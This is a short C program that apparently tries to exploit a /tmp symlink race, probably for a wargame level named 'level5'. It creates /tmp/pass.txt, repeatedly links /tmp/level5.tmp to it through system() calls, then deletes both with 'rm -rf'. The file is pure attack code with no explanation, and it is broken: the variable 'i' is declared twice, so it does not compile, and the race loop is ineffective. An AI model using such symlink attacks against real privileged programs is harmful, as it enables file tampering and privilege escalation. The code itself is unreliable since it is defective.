#include <stdio.h>
#include <unistd.h>

int main()
{
    int i;
    system("touch /tmp/pass.txt");

    int i;
    for (i=0;i<10;i++)
    {
        system("ln -s /tmp/pass.txt /tmp/level5.tmp");
    }
        system("rm -rf /tmp/level5.tmp");
        system("rm -rf /tmp/pass.txt");
}
